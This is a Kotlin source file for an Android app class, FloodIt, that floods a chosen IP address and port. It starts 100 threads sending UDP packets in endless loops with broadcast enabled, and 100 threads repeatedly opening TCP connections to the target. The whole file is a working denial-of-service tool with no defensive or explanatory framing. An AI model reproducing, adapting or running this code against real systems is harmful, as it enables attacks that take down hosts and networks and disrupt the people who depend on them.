package de.sten.heimbrodt.floodit

import android.util.Log
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.PrintWriter
import java.net.*

class FloodIt(targetIp: String, targetPort: String) {
    private lateinit var targetIp: String
    private lateinit var targetPort: String
    init {
        this.targetIp = targetIp
        this.targetPort = targetPort
    }

    fun floodUDP() {
        for(i in 1..100) {
            val t = Thread {
                val client = DatagramSocket()
                val sendData = "Yo what up dawg?".toByteArray()
                client.broadcast = true
                val sendPacket = DatagramPacket(sendData, sendData.size, InetAddress.getByName(this.targetIp), this.targetPort.toInt())
                while(true) {
                    try {
                        client.send(sendPacket)
                        Log.i("Flood", "Sent a packet!")
                    }
                    catch(e: Exception) {
                        Log.e("Flood", "ERROR when sending packet!")
                    }
                }
            }
            t.start()
        }
    }
    fun floodTCP() {


        for(i in 1..100) {
            val t = Thread {
                while(true) {
                    val client = Socket()
                    try {
                        val client = Socket(this.targetIp, this.targetPort.toInt())
                        val writer = PrintWriter(client.getOutputStream(), true)
                        //val reader = BufferedReader(InputStreamReader(client.inputStream))
                        writer.println("Yo what up dawg?")
                        //Log.i("Flood", reader.readLine())
                        Log.i("Flood", "Sent a packet!")
                        client.close()
                    }
                    catch(e: Exception) {
                        Log.e("Flood", "ERROR when sending packet!")
                    }
                }
            }
            t.start()
        }

    }
}